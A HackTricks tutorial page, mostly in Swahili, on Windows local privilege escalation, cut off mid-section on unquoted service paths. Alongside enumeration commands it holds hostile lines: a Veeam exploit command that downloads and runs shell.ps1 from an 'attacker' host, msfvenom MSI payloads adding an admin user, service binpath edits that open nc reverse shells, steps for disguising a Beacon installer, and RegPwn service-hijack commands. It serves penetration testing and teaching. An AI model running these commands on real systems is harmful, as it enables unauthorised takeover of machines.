# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Zana bora zaidi ya kutafuta vectors za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Nadharia ya Awali ya Windows

### Access Tokens

**Kama hujui Access Tokens za Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa habari zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Kama hujui integrity levels katika Windows unapaswa kusoma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Kuna mambo tofauti katika Windows ambayo yanaweza **kukuzuia kuenumerate mfumo**, kuendesha executables au hata **kugundua shughuli zako**. Unapaswa **kusoma** **ukurasa** ufuatao na **kuenumerate** **mbinu hizi zote za ulinzi** kabla ya kuanza enumeration ya privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess processes zilizoanzishwa kupitia `RAiLaunchAdminProcess` zinaweza kutumiwa vibaya kufikia High IL bila prompts wakati AppInfo secure-path checks zimebypassiwa. Angalia workflow maalum ya UIAccess/Admin Protection bypass hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation inaweza kutumiwa vibaya kwa arbitrary SYSTEM registry write (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Windows builds za hivi karibuni pia zilianzisha njia ya **SMB arbitrary-port** ya LPE ambapo local NTLM authentication yenye hadhi ya juu inareflectiwa kupitia reused SMB TCP connection:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Angalia kama Windows version ina vulnerability inayojulikana yoyote (angalia pia patches zilizosimikwa).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) ni muhimu kwa kutafuta taarifa za kina kuhusu udhaifu wa usalama wa Microsoft. Hifadhidata hii ina zaidi ya udhaifu wa usalama 4,700, ikionyesha **eneo kubwa sana la mashambulizi** ambalo mazingira ya Windows huwasilisha.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Je, kuna credential/Juicy info yoyote iliyohifadhiwa kwenye env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historia ya PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Faili za PowerShell Transcript

Unaweza kujifunza jinsi ya kuiwasha katika [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Ufuatiliaji wa Module za PowerShell

Maelezo ya utekelezaji wa pipeline za PowerShell yanarekodiwa, yakijumuisha amri zilizotekelezwa, miito ya amri, na sehemu za scripts. Hata hivyo, maelezo kamili ya utekelezaji na matokeo ya output huenda yasikamatwe.

Ili kuwezesha hili, fuata maelekezo katika sehemu ya "Transcript files" ya nyaraka, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Ili kuona matukio 15 ya mwisho kutoka kwa PowersShell logs unaweza kutekeleza:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na maudhui yote ya utekelezaji wa script hukusanywa, kuhakikisha kwamba kila block ya code inaandikwa inapoendeshwa. Mchakato huu huhifadhi audit trail ya kina ya kila shughuli, yenye thamani kwa forensics na kuchambua tabia mbaya. Kwa kuandika shughuli zote wakati wa utekelezaji, maarifa ya kina kuhusu mchakato hutolewa.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Tukio za kuingia kwa Script Block zinaweza kupatikana ndani ya Windows Event Viewer katika njia: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuona matukio 20 ya mwisho unaweza kutumia:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Mipangilio ya Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Vifaa vya Hifadhi
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Unaweza kuathiri mfumo ikiwa masasisho hayaombwi kwa kutumia http**S** bali http.

Unaanza kwa kuangalia ikiwa mtandao unatumia WSUS update isiyo ya SSL kwa kuendesha yafuatayo katika cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Au au ifuatayo katika PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Ukipata jibu kama moja ya haya:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Na kama `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Basi, **inaweza kutumiwa vibaya.** Ikiwa registry ya mwisho ni sawa na 0, basi ingizo la WSUS litapuuzwa.

Ili kutumia udhaifu huu unaweza kutumia zana kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Hizi ni scripts za exploits zilizoboreshwa kwa MiTM ili kudunga 'fake' updates ndani ya trafiki ya WSUS isiyo na SSL.

Soma utafiti hapa:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Soma ripoti kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Kimsingi, huu ndio udhaifu ambao bug hii hutumia:

> Kama tuna uwezo wa kurekebisha local user proxy yetu, na Windows Updates hutumia proxy iliyosanidiwa katika mipangilio ya Internet Explorer, basi tunakuwa na uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) locally ili kukamata trafiki yetu wenyewe na kuendesha code kama user aliyeongezwa juu kwenye asset yetu.
>
> Zaidi ya hayo, kwa kuwa huduma ya WSUS hutumia mipangilio ya current user, pia itatumia certificate store yake. Tukitengeneza self-signed certificate kwa hostname ya WSUS na kuongeza certificate hii ndani ya certificate store ya current user, tutaweza kukamata trafiki ya WSUS ya HTTP na HTTPS. WSUS haitumii mechanisms za aina ya HSTS ili kutekeleza validation ya trust-on-first-use kwa certificate. Ikiwa certificate iliyowasilishwa inaaminika na user na ina hostname sahihi, itakubaliwa na huduma.

Unaweza kutumia udhaifu huu kwa kutumia zana [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (mara tu itakapokuwa liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.

- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Huduma hiyo hutekeleza amri kama SYSTEM.
## KrbRelayUp

Udhaifu wa **local privilege escalation** upo katika mazingira ya Windows ya **domain** chini ya hali fulani. Hali hizi ni pamoja na mazingira ambamo **LDAP signing haitekelezwi,** watumiaji wana self-rights zinazowawezesha kusanidi **Resource-Based Constrained Delegation (RBCD),** na uwezo wa watumiaji kuunda computers ndani ya domain. Ni muhimu kutambua kwamba **requirements** hizi zinapatikana kwa kutumia **default settings**.

Pata **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa maelezo zaidi kuhusu mtiririko wa shambulio angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Ikiwa** registers hizi 2 zimewezeshwa (thamani ni **0x1**), basi watumiaji wa privilege yoyote wanaweza **install** (execute) `*.msi` files kama NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri `Write-UserAddMSI` kutoka power-up kuunda ndani ya saraka ya sasa faili la binary la Windows MSI ili kuongeza privileges. Script hii huandika nje MSI installer iliyokusanywa awali ambayo huuliza uongezaji wa user/group (kwa hiyo utahitaji GIU access):
```
Write-UserAddMSI
```
Just execute the created binary to escalate privileges.

### MSI Wrapper

Soma mafunzo haya ili kujifunza jinsi ya kuunda MSI wrapper kwa kutumia hizi tools. Kumbuka kwamba unaweza kufunga "**.bat**" file ikiwa unataka tu **kutekeleza** command lines


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na charaza "installer" kwenye kisanduku cha utafutaji. Chagua project ya **Setup Wizard** na bofya **Next**.
- Ipe project jina, kama **AlwaysPrivesc**, tumia **`C:\privesc`** kama location, chagua **place solution and project in the same directory**, na bofya **Create**.
- Endelea kubofya **Next** hadi ufikie hatua ya 3 kati ya 4 (choose files to include). Bofya **Add** na uchague Beacon payload uliyotengeneza hivi punde. Kisha bofya **Finish**.
- Chagua project ya **AlwaysPrivesc** katika **Solution Explorer** na katika **Properties**, badilisha **TargetPlatform** kutoka **x86** kwenda **x64**.
- Kuna properties nyingine unaweza kubadilisha, kama **Author** na **Manufacturer** ambazo zinaweza kufanya app iliyosakinishwa ionekane ya halali zaidi.
- Bofya kulia project na uchague **View > Custom Actions**.
- Bofya kulia **Install** na uchague **Add Custom Action**.
- Bofya mara mbili kwenye **Application Folder**, chagua file yako ya **beacon.exe** na bofya **OK**. Hii itahakikisha kwamba beacon payload inatekelezwa mara tu installer inapotekelezwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Hatimaye, **build it**.
- Ikiwa warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` inaonekana, hakikisha umeweka platform kuwa x64.

### MSI Installation

Ili kutekeleza **installation** ya malicious `.msi` file kwa **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Ili kutumia udhaifu huu unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus na Detectors

### Audit Settings

Mipangilio hii huamua nini kinaandikwa kwenye **log**, kwa hiyo unapaswa kuzingatia
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, ni muhimu kujua logs zinatumwa wapi
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za Administrator za ndani**, kuhakikisha kwamba kila nywila ni **ya kipekee, ya nasibu, na inasasishwa mara kwa mara** kwenye kompyuta zilizounganishwa kwenye domain. Nywila hizi huhifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji ambao wamepewa ruhusa ya kutosha kupitia ACLs, kuruhusu wao kuona nywila za local admin ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa active, **plain-text passwords huhifadhiwa katika LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Ulinzi wa LSA

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioimarishwa kwa Local Security Authority (LSA) ili **kuzuia** majaribio ya michakato isiyoaminika ya **kusoma kumbukumbu yake** au kudunga code, hivyo kuimarisha zaidi mfumo.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credential Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Madhumuni yake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama vile mashambulizi ya pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Vitambulisho Vilivyohifadhiwa

**Vitambulisho vya domain** vinathibitishwa na **Local Security Authority** (LSA) na hutumiwa na vipengele vya mfumo wa uendeshaji. Wakati data ya kuingia ya mtumiaji inathibitishwa na registered security package, vitambulisho vya domain kwa mtumiaji huyo kwa kawaida huanzishwa.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Watumiaji & Vikundi

### Bainisha Watumiaji & Vikundi

Unapaswa kuangalia kama vikundi vyovyote ambavyo wewe ni mwanachama vina ruhusa za kuvutia
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Vikundi vya privileged

Ikiwa **unamiliki baadhi ya kikundi cha privileged unaweza kuwa na uwezo wa kupandisha privileges**. Jifunze kuhusu vikundi vya privileged na jinsi ya kuvinyanyasa ili kupandisha privileges hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Jifunze zaidi** kuhusu nini ni **token** kwenye ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **ujifunze kuhusu interesting tokens** na jinsi ya kuzinyanyasa:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### Folda za nyumbani
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Sera ya Nenosiri
```bash
net accounts
```
### Pata maudhui ya clipboard
```bash
powershell -command "Get-Clipboard"
```
## Michakato Inayoendelea

### Ruhusa za Faili na Folda

Kwanza kabisa, wakati wa kuorodhesha michakato **angalia kama kuna nenosiri ndani ya command line ya mchakato**.\
Angalia kama unaweza **kuandika upya binary fulani inayoendeshwa** au kama una ruhusa za kuandika za folda ya binary ili kutumia mashambulizi yanayoweza kutokea ya [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Kila wakati angalia kama kuna [**electron/cef/chromium debuggers**](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md) zinazoendeshwa, unaweza kuzitumia vibaya ili kuongeza ruhusa zako.

**Kuangalia ruhusa za binaries za processes**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kuangalia ruhusa za folda za binaries za michakato (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Uchimbaji wa nenosiri kutoka kwenye kumbukumbu

Unaweza kuunda memory dump ya mchakato unaoendelea kwa kutumia **procdump** kutoka sysinternals. Huduma kama FTP huwa na **credentials katika clear text kwenye memory**, jaribu kudump memory na kusoma credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Programu za GUI zisizo salama

**Programu zinazotumia SYSTEM zinaweza kumruhusu mtumiaji kuzindua CMD, au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bofya "Click to open Command Prompt"

## Services

Service Triggers huruhusu Windows kuanzisha service wakati hali fulani zinapotokea (shughuli za named pipe/RPC endpoint, matukio ya ETW, upatikanaji wa IP, kuwasili kwa device, GPO refresh, n.k.). Hata bila SERVICE_START rights mara nyingi unaweza kuanzisha privileged services kwa kuchochea triggers zake. Tazama mbinu za enumeration na activation hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

Pata orodha ya services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Ruhusa

Unaweza kutumia **sc** kupata taarifa za huduma.
```bash
sc qc <service_name>
```
Inapendekezwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha privilege kinachohitajika kwa kila service.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Inashauriwa kuangalia kama "Authenticated Users" wanaweza kurekebisha huduma yoyote:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Unaweza kupakua accesschk.exe ya XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Washa service

Ikiwa unapata error hii (kwa mfano na SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Unaweza kuiwasha kwa kutumia
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Zingatia kuwa huduma upnphost inategemea SSDPSRV ili ifanye kazi (kwa XP SP1)**

**Workaround nyingine** ya tatizo hili ni kuendesha:
```
sc.exe config usosvc start= auto
```
### **Badilisha njia ya binary ya huduma**

Katika hali ambapo kundi la "Authenticated users" lina **SERVICE_ALL_ACCESS** kwenye huduma, inawezekana kubadilisha executable binary ya huduma. Ili kubadilisha na kuendesha **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Anzisha upya service
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Haki za upendeleo zinaweza kupandishwa kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Huruhusu kusanidi upya binary ya huduma.
- **WRITE_DAC**: Huwezesha usanidi upya wa ruhusa, jambo linalowezesha kubadilisha usanidi wa huduma.
- **WRITE_OWNER**: Huiruhusu kuchukua umiliki na kusanidi upya ruhusa.
- **GENERIC_WRITE**: Huirithi uwezo wa kubadilisha usanidi wa huduma.
- **GENERIC_ALL**: Pia huirithi uwezo wa kubadilisha usanidi wa huduma.

Kwa utambuzi na unyonyaji wa udhaifu huu, _exploit/windows/local/service_permissions_ inaweza kutumika.

### Services binaries weak permissions

**Angalia ikiwa unaweza kurekebisha binary inayotekelezwa na service** au ikiwa una **write permissions kwenye folda** ambamo binary iko ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata kila binary inayotekelezwa na service kwa kutumia **wmic** (si katika system32) na kuangalia ruhusa zako kwa kutumia **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Unaweza pia kutumia **sc** na **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Ruhusa za kurekebisha huduma katika registry

Unapaswa kuangalia ikiwa unaweza kurekebisha registry ya huduma yoyote.\
Unaweza **kagua** **ruhusa** zako juu ya **registry** ya huduma kwa kufanya:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Inapaswa kukaguliwa kama **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana `FullControl` permissions. Ikiwa ndivyo, binary inayotekelezwa na service inaweza kubadilishwa.

Ili kubadilisha Path ya binary inayotekelezwa:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Baadhi ya vipengele vya Windows Accessibility huunda funguo za **ATConfig** kwa kila mtumiaji ambazo baadaye huinakiliwa na mchakato wa **SYSTEM** kwenda kwenye ufunguo wa kikao wa HKLM. **Registry symbolic link race** inaweza kuelekeza uandishi huo wenye haki kwenda kwenye **njia yoyote ya HKLM**, ikitoa primitive ya **arbitrary HKLM value write**.

Nafasi muhimu (mfano: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` huorodhesha vipengele vya accessibility vilivyosakinishwa.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` huhifadhi usanidi unaodhibitiwa na mtumiaji.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` huundwa wakati wa logon/secure-desktop transitions na inaweza kuandikwa na mtumiaji.

Mtiririko wa abuse (CVE-2026-24291 / ATConfig):

1. Jaza thamani ya **HKCU ATConfig** unayotaka iandikwe na SYSTEM.
2. Chochea secure-desktop copy (mfano, **LockWorkstation**), ambayo huanzisha mtiririko wa AT broker.
3. **Shinda race** kwa kuweka **oplock** kwenye `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; oplock ikiwaka, badilisha ufunguo wa **HKLM Session ATConfig** uwe **registry link** kuelekea protected HKLM target.
4. SYSTEM huandika thamani iliyochaguliwa na mshambuliaji kwenye njia ya HKLM iliyoelekezwa upya.

Ukishapata arbitrary HKLM value write, pivota kwenda LPE kwa ku-overwrite service configuration values:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chagua service ambayo mtumiaji wa kawaida anaweza kuanzisha (mfano, **`msiserver`**) na uichochee baada ya uandishi. **Note:** utekelezaji wa exploit wa umma **hufunga workstation** kama sehemu ya race.

Mfano wa tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Ruhusa za Services registry AppendData/AddSubdirectory

Ukiwa na ruhusa hii juu ya registry, hii inamaanisha kuwa **unaweza kuunda sub registries kutoka kwenye hii**. Kwa upande wa Windows services hii ni **tosha kutekeleza arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ikiwa path ya executable haiko ndani ya quotes, Windows itajaribu kutekeleza kila sehemu ya mwisho kabla ya space.

Kwa mfano, kwa path _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:
```bash
C:\Program.exe
C:\Program Files\Some.exe
